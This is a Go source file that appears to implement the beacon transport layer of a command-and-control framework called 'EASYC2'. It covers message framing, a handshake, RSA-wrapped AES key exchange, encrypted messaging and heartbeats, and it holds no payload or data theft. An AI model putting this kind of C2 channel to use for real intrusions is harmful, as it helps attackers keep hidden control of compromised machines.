package common

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

// BeaconMessageType 消息类型
type BeaconMessageType uint8

const (
	// 握手消息类型
	BeaconHandshake BeaconMessageType = 0x01
	BeaconHandshakeAck BeaconMessageType = 0x02
	
	// 密钥交换消息类型
	BeaconKeyExchange BeaconMessageType = 0x03
	BeaconKeyExchangeAck BeaconMessageType = 0x04
	
	// 数据消息类型
	BeaconData BeaconMessageType = 0x05
	BeaconAck BeaconMessageType = 0x06
	
	// 心跳消息类型
	BeaconHeartbeat BeaconMessageType = 0x07
	BeaconHeartbeatAck BeaconMessageType = 0x08
)

// BeaconMessage beacon消息结构
type BeaconMessage struct {
	Type    BeaconMessageType
	Length  uint32
	Payload []byte
}

// BeaconConnection beacon连接
type BeaconConnection struct {
	Conn          net.Conn
	CryptoManager *CryptoManager
	Reader        *bufio.Reader
	Writer        *bufio.Writer
	Connected     bool
}

// NewBeaconConnection 创建新的beacon连接
func NewBeaconConnection(conn net.Conn) *BeaconConnection {
	return &BeaconConnection{
		Conn:          conn,
		CryptoManager: NewCryptoManager(),
		Reader:        bufio.NewReader(conn),
		Writer:        bufio.NewWriter(conn),
		Connected:     false,
	}
}

// SendMessage 发送消息
func (bc *BeaconConnection) SendMessage(msgType BeaconMessageType, payload []byte) error {
	msg := BeaconMessage{
		Type:    msgType,
		Length:  uint32(len(payload)),
		Payload: payload,
	}
	data := bc.serializeMessage(msg)

	if bc.Connected && bc.CryptoManager.AESKey != nil {
		// 加密整个消息
		ciphertext, err := bc.CryptoManager.EncryptWithAES(data)
		if err != nil {
			return fmt.Errorf("加密消息失败: %v", err)
		}
		// 先写4字节密文长度
		lenBuf := make([]byte, 4)
		binary.BigEndian.PutUint32(lenBuf, uint32(len(ciphertext)))
		if _, err := bc.Writer.Write(lenBuf); err != nil {
			return fmt.Errorf("发送密文长度失败: %v", err)
		}
		// 再写密文
		if _, err := bc.Writer.Write(ciphertext); err != nil {
			return fmt.Errorf("发送密文失败: %v", err)
		}
		return bc.Writer.Flush()
	} else {
		// 明文模式，直接写
		if _, err := bc.Writer.Write(data); err != nil {
			return fmt.Errorf("发送消息失败: %v", err)
		}
		return bc.Writer.Flush()
	}
}

// ReadMessage 读取消息
func (bc *BeaconConnection) ReadMessage() (*BeaconMessage, error) {
	if bc.Connected && bc.CryptoManager.AESKey != nil {
		// 先读4字节密文长度
		lenBuf := make([]byte, 4)
		if _, err := io.ReadFull(bc.Reader, lenBuf); err != nil {
			return nil, fmt.Errorf("读取密文长度失败: %v", err)
		}
		length := binary.BigEndian.Uint32(lenBuf)
		if length == 0 || length > 10*1024*1024 {
			return nil, fmt.Errorf("密文长度异常: %d", length)
		}
		// 读密文
		ciphertext := make([]byte, length)
		if _, err := io.ReadFull(bc.Reader, ciphertext); err != nil {
			return nil, fmt.Errorf("读取密文失败: %v", err)
		}
		// 解密
		plaintext, err := bc.CryptoManager.DecryptWithAES(ciphertext)
		if err != nil {
			return nil, fmt.Errorf("AES解密失败: %v", err)
		}
		// 解析消息
		if len(plaintext) < 5 {
			return nil, fmt.Errorf("解密后数据长度不足")
		}
		msgType := BeaconMessageType(plaintext[0])
		msgLen := binary.BigEndian.Uint32(plaintext[1:5])
		if int(msgLen) != len(plaintext)-5 {
			return nil, fmt.Errorf("消息长度不匹配")
		}
		return &BeaconMessage{
			Type:    msgType,
			Length:  msgLen,
			Payload: plaintext[5:],
		}, nil
	} else {
		// 明文模式，直接读5字节header
		header := make([]byte, 5)
		if _, err := io.ReadFull(bc.Reader, header); err != nil {
			return nil, fmt.Errorf("读取消息头失败: %v", err)
		}
		msgType := BeaconMessageType(header[0])
		length := binary.BigEndian.Uint32(header[1:])
		payload := make([]byte, length)
		if length > 0 {
			if _, err := io.ReadFull(bc.Reader, payload); err != nil {
				return nil, fmt.Errorf("读取消息体失败: %v", err)
			}
		}
		return &BeaconMessage{
			Type:    msgType,
			Length:  length,
			Payload: payload,
		}, nil
	}
}

// serializeMessage 序列化消息
func (bc *BeaconConnection) serializeMessage(msg BeaconMessage) []byte {
	data := make([]byte, 5+len(msg.Payload))
	data[0] = byte(msg.Type)
	binary.BigEndian.PutUint32(data[1:], msg.Length)
	copy(data[5:], msg.Payload)
	return data
}

// PerformHandshake 执行握手（客户端）
func (bc *BeaconConnection) PerformHandshake() error {
	// 发送握手消息
	handshakeData := []byte("EASYC2_BEACON_HANDSHAKE")
	err := bc.SendMessage(BeaconHandshake, handshakeData)
	if err != nil {
		return fmt.Errorf("发送握手消息失败: %v", err)
	}
	
	// 等待握手确认
	msg, err := bc.ReadMessage()
	if err != nil {
		return fmt.Errorf("读取握手确认失败: %v", err)
	}
	
	if msg.Type != BeaconHandshakeAck {
		return fmt.Errorf("收到意外的消息类型: %d", msg.Type)
	}
	
	fmt.Println("握手成功")
	return nil
}

// HandleHandshake 处理握手（服务端）
func (bc *BeaconConnection) HandleHandshake() error {
	// 等待握手消息
	msg, err := bc.ReadMessage()
	if err != nil {
		return fmt.Errorf("读取握手消息失败: %v", err)
	}
	
	if msg.Type != BeaconHandshake {
		return fmt.Errorf("收到意外的消息类型: %d", msg.Type)
	}
	
	// 发送握手确认
	err = bc.SendMessage(BeaconHandshakeAck, []byte("EASYC2_BEACON_HANDSHAKE_ACK"))
	if err != nil {
		return fmt.Errorf("发送握手确认失败: %v", err)
	}
	
	fmt.Println("握手处理成功")
	return nil
}

// PerformKeyExchange 执行密钥交换（客户端）
func (bc *BeaconConnection) PerformKeyExchange() error {
	// 生成RSA密钥对
	err := bc.CryptoManager.GenerateRSAKeyPair(2048)
	if err != nil {
		return fmt.Errorf("生成RSA密钥对失败: %v", err)
	}
	
	// 获取公钥PEM格式
	pubKeyPEM, err := bc.CryptoManager.GetPublicKeyPEM()
	if err != nil {
		return fmt.Errorf("获取公钥PEM失败: %v", err)
	}
	
	// 发送公钥
	err = bc.SendMessage(BeaconKeyExchange, []byte(pubKeyPEM))
	if err != nil {
		return fmt.Errorf("发送公钥失败: %v", err)
	}
	
	// 等待加密的AES密钥
	msg, err := bc.ReadMessage()
	if err != nil {
		return fmt.Errorf("读取加密AES密钥失败: %v", err)
	}
	
	if msg.Type != BeaconKeyExchangeAck {
		return fmt.Errorf("收到意外的消息类型: %d", msg.Type)
	}
	
	// 解密AES密钥
	aesKey, err := bc.CryptoManager.DecryptAESKeyWithRSA(msg.Payload)
	if err != nil {
		return fmt.Errorf("解密AES密钥失败: %v", err)
	}
	
	// 设置AES密钥
	bc.CryptoManager.SetAESKey(aesKey)
	bc.Connected = true
	
	fmt.Println("密钥交换成功")
	return nil
}

// HandleKeyExchange 处理密钥交换（服务端）
func (bc *BeaconConnection) HandleKeyExchange() error {
	// 等待公钥
	msg, err := bc.ReadMessage()
	if err != nil {
		return fmt.Errorf("读取公钥失败: %v", err)
	}
	
	if msg.Type != BeaconKeyExchange {
		return fmt.Errorf("收到意外的消息类型: %d", msg.Type)
	}
	
	// 设置客户端公钥
	err = bc.CryptoManager.SetPublicKeyFromPEM(string(msg.Payload))
	if err != nil {
		return fmt.Errorf("设置公钥失败: %v", err)
	}
	
	// 生成AES密钥
	err = bc.CryptoManager.GenerateAESKey()
	if err != nil {
		return fmt.Errorf("生成AES密钥失败: %v", err)
	}
	
	// 使用RSA加密AES密钥
	encryptedKey, err := bc.CryptoManager.EncryptAESKeyWithRSA(bc.CryptoManager.AESKey)
	if err != nil {
		return fmt.Errorf("加密AES密钥失败: %v", err)
	}
	
	// 发送加密的AES密钥
	err = bc.SendMessage(BeaconKeyExchangeAck, encryptedKey)
	if err != nil {
		return fmt.Errorf("发送加密AES密钥失败: %v", err)
	}
	
	bc.Connected = true
	fmt.Println("密钥交换处理成功")
	return nil
}

// SendData 发送数据
func (bc *BeaconConnection) SendData(data []byte) error {
	return bc.SendMessage(BeaconData, data)
}

// SendHeartbeat 发送心跳
func (bc *BeaconConnection) SendHeartbeat() error {
	heartbeatData := []byte(fmt.Sprintf("heartbeat_%d", time.Now().Unix()))
	return bc.SendMessage(BeaconHeartbeat, heartbeatData)
}

// StartHeartbeat 开始心跳
func (bc *BeaconConnection) StartHeartbeat(interval time.Duration) {
	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()
		
		for {
			select {
			case <-ticker.C:
				if bc.Connected {
					err := bc.SendHeartbeat()
					if err != nil {
						fmt.Printf("发送心跳失败: %v\n", err)
						return
					}
				}
			}
		}
	}()
}

// Close 关闭连接
func (bc *BeaconConnection) Close() error {
	bc.Connected = false
	return bc.Conn.Close()
} 